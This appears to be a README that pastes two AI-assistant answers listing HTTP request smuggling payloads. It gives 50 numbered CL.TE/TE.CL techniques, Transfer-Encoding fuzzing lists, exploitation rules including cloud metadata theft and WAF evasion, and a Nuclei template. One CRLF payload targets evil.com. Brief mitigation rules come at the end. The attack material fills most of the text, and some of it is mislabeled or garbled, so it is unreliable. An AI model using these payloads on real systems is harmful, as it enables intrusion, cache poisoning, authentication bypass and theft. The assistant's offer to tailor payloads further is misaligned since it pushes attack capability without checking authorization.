# smuglingdz
smuglingdz


I'll provide you with **50 advanced HTTP request smuggling techniques and scan rules** that go beyond common knowledge. These focus on edge cases, parser differentials, and novel exploitation vectors.

## 🕵️ HTTP Request Smuggling: Advanced Techniques

### **1. CL.TE with Unicode Normalization**
```
Content-Length: 35\r\n
Content-Length: 35\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
```

### **2. TE.CL with Folded Headers**
```
Transfer-Encoding: chunked\r\n
 Content-Length: 4\r\n
\r\n
5c\r\n
GET /admin HTTP/1.1\r\n
Host: internal\r\n
\r\n
0\r\n
\r\n
```

### **3. Space Obfuscation in Headers**
```
Transfer-Encoding : chunked\r\n
Content-Length : 56\r\n
Transfer-Encoding: identity\r\n
```

### **4. Multi-line Header Values**
```
Transfer-Encoding: chunked,\r\n
 chunked\r\n
Content-Length: 0\r\n
```

### **5. Null Byte Injection**
```
Content-Length: 35\r\n
Transfer-Encoding:\0chunked\r\n
```

### **6. CRLF Injection in Header Names**
```
Transfer-Encoding\r\n: chunked\r\n
Content-Length: 56\r\n
```

### **7. Tab Character Variations**
```
Transfer-Encoding:\tchunked\r\n
Content-Length:\t56\r\n
```

### **8. Header Case Sensitivity Exploits**
```
transfer-encoding: chunked\r\n
CONTENT-LENGTH: 56\r\n
```

### **9. Double Chunked Encoding**
```
Transfer-Encoding: chunked\r\n
Transfer-Encoding: chunked\r\n
Content-Length: 56\r\n
```

### **10. Chunked with Invalid Size**
```
Transfer-Encoding: chunked\r\n
\r\n
fffffffffffffffff\r\n
GET /admin HTTP/1.1\r\n
```

### **11. Chunk Extensions Abuse**
```
Transfer-Encoding: chunked\r\n
\r\n
5;extension=value\r\n
GET /a\r\n
0\r\n
\r\n
```

### **12. Trailing Headers After Chunked**
```
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
X-Ignored: header\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **13. Content-Length with Leading Zeros**
```
Content-Length: 00000000000000000056\r\n
Transfer-Encoding: chunked\r\n
```

### **14. Negative Content-Length**
```
Content-Length: -1\r\n
Transfer-Encoding: chunked\r\n
```

### **15. Content-Length with Plus Sign**
```
Content-Length: +56\r\n
Transfer-Encoding: chunked\r\n
```

### **16. Header Continuation with Space**
```
Content-Length: 56\r\n
 Transfer-Encoding: chunked\r\n
```

### **17. Multiple Transfer-Encoding with Different Cases**
```
TrAnSfEr-EnCoDiNg: chunked\r\n
transfer-encoding: identity\r\n
Content-Length: 56\r\n
```

### **18. Chunked with Premature Termination**
```
Transfer-Encoding: chunked\r\n
\r\n
5\r\n
GET /\r\n
```

### **19. CL.TE with Garbage After Length**
```
Content-Length: 56 abc\r\n
Transfer-Encoding: chunked\r\n
```

### **20. TE.TE with Unknown Encodings**
```
Transfer-Encoding: x-chunked, chunked\r\n
Content-Length: 56\r\n
```

### **21. BOM Character Injection**
```
\xEF\xBB\xBFTransfer-Encoding: chunked\r\n
Content-Length: 56\r\n
```

### **22. Non-ASCII Header Names**
```
Tranfer-Encoding😈: chunked\r\n
Content-Length: 56\r\n
```

### **23. Header Value Wrapping**
```
Transfer-Encoding: chunked\r\n
Content-Length: 56\r\n
 \t \r\n
```

### **24. Request Line Smuggling**
```
POST / HTTP/1.1\r\n
Host: a\r\n
Content-Length: 60\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: b\r\n
\r\n
```

### **25. HTTP/2 to HTTP/1.1 Downgrade**
```
:method: POST\r\n
:path: /\r\n
:authority: a.com\r\n
content-length: 5\r\n
transfer-encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin\r\n
```

### **26. Connection Header Manipulation**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Connection: keep-alive, close\r\n
```

### **27. Expect: 100-continue Race**
```
Content-Length: 100\r\n
Transfer-Encoding: chunked\r\n
Expect: 100-continue\r\n
\r\n
[delay]\r\n
GET /admin\r\n
```

### **28. Host Header Overload**
```
Host: a.com\r\n
Host: b.com\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **29. Cookie Injection Smuggling**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Cookie: session=smuggled\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **30. URL Encoding in Headers**
```
Transfer-Encoding: %63hunked\r\n
Content-Length: 56\r\n
```

### **31. Multi-byte Character Exploits**
```
Transfer-Encoding: chunked\r\n
Content-Length: 5%36\r\n
```

### **32. Backspace Character Injection**
```
Transfer-Encoding: chunked\r\n
Content-Length: 56\x08\r\n
```

### **33. Header Injection via Parameter Pollution**
```
GET /?header=Transfer-Encoding:%20chunked HTTP/1.1\r\n
```

### **34. WebSocket Upgrade Smuggling**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Upgrade: websocket\r\n
Connection: Upgrade\r\n
\r\n
0\r\n
\r\n
GET /ws HTTP/1.1\r\n
```

### **35. Proxy Protocol Injection**
```
PROXY TCP4 1.2.3.4 5.6.7.8 1234 80\r\n
POST /admin HTTP/1.1\r\n
Host: internal\r\n
```

### **36. Cache Poisoning via Smuggling**
```
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /poisoned.html HTTP/1.1\r\n
Host: target.com\r\n
X-Forwarded-Host: attacker.com\r\n
```

### **37. Authentication Bypass via Header Inheritance**
```
POST / HTTP/1.1\r\n
Host: target.com\r\n
Authorization: Bearer smuggled\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **38. Vary Header Manipulation**
```
GET / HTTP/1.1\r\n
Host: target.com\r\n
Vary: X-Smuggled-Header\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
```

### **39. Range Header Smuggling**
```
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
Range: bytes=0-100\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **40. Content-Type Boundary Confusion**
```
Content-Type: multipart/form-data; boundary=xxx\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
\r\n
--xxx\r\n
GET /admin HTTP/1.1\r\n
```

### **41. HTTP/0.9 Fallback**
```
GET /\r\n
\r\n
POST /admin HTTP/1.1\r\n
Host: localhost\r\n
```

### **42. Chunked with NULL Chunks**
```
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **43. Header Name with Colon in Value**
```
Transfer-Encoding: chunked\r\n
Content-Length: 56: 57\r\n
```

### **44. Mixed Protocol Smuggling**
```
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 0\r\n
\r\n
\r\n
GET /admin HTTP/2.0\r\n
```

### **45. Via Header Injection**
```
Via: 1.1 smuggled-proxy\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **46. Forwarded Header Abuse**
```
Forwarded: for=1.2.3.4;proto=http\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **47. X-Forwarded-For Chain**
```
X-Forwarded-For: 127.0.0.1\r\n
X-Forwarded-For: internal\r\n
Content-Length: 56\r\n
Transfer-Encoding: chunked\r\n
```

### **48. TE with Transfer-Encoding in Body**
```
POST / HTTP/1.1\r\n
Content-Length: 100\r\n
\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

### **49. Chunked with Extended ASCII**
```
Transfer-Encoding: chunked\r\n
\r\n
5\xC3\xA8\r\n
GET /\r\n
0\r\n
\r\n
```

### **50. Request Smuggling via Web Cache Deception**
```
GET /static/style.css HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 35\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: target.com\r\n
```

## 📋 Advanced Scan Rules

### **Detection Rules**
1. **Time-based differential**: Send two requests and measure response time variance >2s
2. **Connection reuse validation**: Force connection reuse and check for desync
3. **Header normalization fuzzing**: Test all RFC 7230 variations
4. **Response queue analysis**: Monitor for out-of-order responses
5. **Error page differential**: Compare 400/500 responses for parser differences

### **Parser Differential Rules**
6. **Apache vs Nginx vs HAProxy**: Test each combination
7. **CDN bypass**: Check Cloudflare, Akamai, Fastly edge cases
8. **WAF evasion**: Test with WAF-specific header handling
9. **Load balancer inconsistencies**: Round-robin vs sticky sessions
10. **Microservice mesh variations**: Istio, Linkerd, Consul

### **Exploitation Rules**
11. **Internal service discovery**: Smuggle to localhost:8080, 3000, 5000
12. **Cloud metadata theft**: Target 169.254.169.254
13. **Redis/Memcached injection**: Smuggle raw protocol commands
14. **GraphQL introspection bypass**: Target /graphql endpoints
15. **WebSocket hijacking**: Upgrade connection smuggling

### **Fuzzing Parameters**
16. **Header count**: 1-1000 headers
17. **Header size**: 1-65535 bytes
18. **Chunk size variations**: 1-65535 bytes
19. **CRLF positions**: Normal, double, triple, mixed
20. **Null byte positions**: Prefix, infix, suffix

### **Protocol-Specific Rules**
21. **HTTP/2 stream multiplexing**
22. **HTTP/3 QUIC stream isolation**
23. **WebSocket frame boundaries**
24. **gRPC metadata injection**
25. **SOAP/XML boundary confusion**

## 🔧 Automated Detection Tools

```python
# Custom Nuclei template example
id: advanced-http-smuggling
info:
  name: TE.CL with Unicode Normalization
  severity: high

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 35
        Transfer-Encoding: chunked
        Transfer-Encoding: chunked
        
        0
        
        GET /admin HTTP/1.1
        Host: localhost
```

```bash
# Custom Burp Suite extension logic
def scan_http_smuggling(base_request):
    techniques = [
        cl_te_unicode,
        te_cl_folded_headers,
        space_obfuscation,
        null_byte_injection,
        multi_line_headers
    ]
    
    for technique in techniques:
        smuggled = technique(base_request)
        response1 = send_request(smuggled, reuse_conn=True)
        response2 = send_request(base_request, reuse_conn=True)
        
        if response1 != response2:
            report_vulnerability(technique, smuggled)
```

## 🛡️ Mitigation Rules

1. **Normalize all headers** before processing
2. **Reject ambiguous requests** with both CL and TE
3. **Use HTTP/2 end-to-end** where possible
4. **Implement request validation** at edge
5. **Disable connection reuse** for untrusted clients
6. **Use strict header parsing** (drop on any deviation)
7. **Limit header count and size**
8. **Log all parser errors** for monitoring

## 📚 References

- RFC 7230 Section 3.3.3: Message Body Length
- CVE-2019-20372: Apache HTTP Server request smuggling
- PortSwigger Research: HTTP Desync Attacks
- BlackHat 2021: HTTP/2 Request Smuggling

These techniques represent advanced, often undocumented vectors for HTTP request smuggling. Always ensure you have proper authorization before testing, as these can cause service disruption if not handled carefully.

I understand now — you're asking for **payloads** (test cases, attack vectors, or fuzzing inputs) related to the `Transfer-Encoding` header. This is commonly used in **security testing**, **HTTP smuggling**, **request smuggling**, and **fuzzing** scenarios.

Here's a comprehensive list of `Transfer-Encoding` payloads:

---

## 1. Basic Encoding Variations

### Standard valid
```
Transfer-Encoding: chunked
Transfer-Encoding: gzip
Transfer-Encoding: deflate
Transfer-Encoding: compress
Transfer-Encoding: gzip, chunked
Transfer-Encoding: deflate, chunked
Transfer-Encoding: gzip, deflate, chunked
```

### Case variations
```
transfer-encoding: chunked
TRANSFER-ENCODING: chunked
TrAnSfEr-EnCoDiNg: chunked
```

### Whitespace variations
```
Transfer-Encoding: chunked
Transfer-Encoding:  chunked
Transfer-Encoding: chunked  
Transfer-Encoding:    chunked
Transfer-Encoding: chunked\t
Transfer-Encoding:\tchunked
Transfer-Encoding: chunked\r\n
```

---

## 2. Chunked Encoding Payloads (for HTTP Smuggling)

### Standard chunked format
```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

5
hello
0

```

### CL.TE (Content-Length + Transfer-Encoding) smuggling
```
POST / HTTP/1.1
Host: example.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

```

### TE.CL smuggling
```
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12
GET /admin HTTP/1.1
Host: localhost
0

```

### Obfuscated Transfer-Encoding header
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunkedx
Transfer-Encoding: chunked, chunked
Transfer-Encoding: chunked, identity
Transfer-Encoding: chunked; charset=utf-8
Transfer-Encoding: chunked; boundary=something
Transfer-Encoding: chunked, x-gzip
Transfer-Encoding: CHUNKED
Transfer-Encoding: chunkEd
```

---

## 3. Malformed / Fuzzing Payloads

### Invalid encoding names
```
Transfer-Encoding: chunked2
Transfer-Encoding: chunk
Transfer-Encoding: chunked, invalid
Transfer-Encoding: foobar
Transfer-Encoding: null
Transfer-Encoding: 123
Transfer-Encoding: chunked;foo=bar
Transfer-Encoding: chunked,,gzip
Transfer-Encoding: chunked, ,gzip
Transfer-Encoding: ,chunked
Transfer-Encoding: chunked, 
Transfer-Encoding: (chunked)
Transfer-Encoding: "chunked"
Transfer-Encoding: 'chunked'
```

### Multiple headers (duplicate)
```
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```
```
Transfer-Encoding: gzip
Transfer-Encoding: chunked
```

### Combined with Content-Length variations
```
Content-Length: 0
Transfer-Encoding: chunked
```
```
Content-Length: 100
Transfer-Encoding: chunked
```
```
Content-Length: 
Transfer-Encoding: chunked
```
```
Content-Length: -1
Transfer-Encoding: chunked
```

---

## 4. Chunk Extension Payloads

### Chunk extensions (RFC 7230)
```
Transfer-Encoding: chunked

5;foo=bar
hello
0;trailer=value

```
```
5;foo="bar"
hello
0;done=true

```
```
5;ignore
hello
0

```

### Chunk size variations
```
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
0

```
(Zero-length chunk mid-stream)

```
ffffffffffffffff
...
```
(Extremely large chunk size)

```
-1
...
```
(Negative chunk size)

```
0x5
...
```
(Hex with prefix)

```
5
...
```
(Valid)

```
05
...
```
(Leading zero)

```
5 
...
```
(Space after size)

---

## 5. Header Injection / CRLF Payloads

```
Transfer-Encoding: chunked\r\nX-Injected: true
```
```
Transfer-Encoding: chunked\r\n\r\nGET /evil HTTP/1.1\r\nHost: evil.com
```
```
Transfer-Encoding: chunked\nX-Evil: true
```

---

## 6. TE Header (Client Request) Payloads

The client `TE` header negotiates accepted transfer encodings:

```
TE: chunked
TE: gzip
TE: deflate
TE: chunked, gzip, deflate
TE: trailers
TE: chunked;q=0.8, gzip;q=0.5
TE: 
TE: *
TE: chunked, identity
TE: compress
```

---

## 7. Combined Attack Vectors

### HTTP/2 to HTTP/1 smuggling
```
:method: POST
:path: /
:scheme: https
transfer-encoding: chunked
content-length: 100

0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n
```

### Chunked + Connection header
```
Transfer-Encoding: chunked
Connection: keep-alive, Transfer-Encoding
```

### Chunked with trailer headers
```
Transfer-Encoding: chunked

5
hello
0
X-Malicious: true

```

---

## 8. Null Byte / Unicode Payloads

```
Transfer-Encoding: chunked%00
Transfer-Encoding: chunked\x00
Transfer-Encoding: chunked%0d%0a
Transfer-Encoding: chunked﻿
Transfer-Encoding: chunked⁠
```

---

## Summary Table by Category

| Category | Purpose |
|----------|---------|
| Valid encodings | Baseline functionality |
| Case/whitespace | Bypass weak filters |
| CL/TE smuggling | Request smuggling attacks |
| TE/CL smuggling | Request smuggling attacks |
| Obfuscated names | WAF/filter bypass |
| Chunk extensions | Chunk parsing edge cases |
| Chunk size fuzzing | Integer overflow/parsing bugs |
| Duplicate headers | Header normalization bypass |
| CRLF injection | Header injection attacks |
| TE negotiation | Client-side fuzzing |
| Null/Unicode | Parser differential attacks |

---

If you're looking for specific **automated tools** to generate these (like `httpx`, `ffuf`, ` smuggler.py`, or Burp Intruder payloads), or want **targeted payloads** for a specific scenario (WAF bypass, HTTP smuggling, fuzzing), let me know and I'll tailor them.
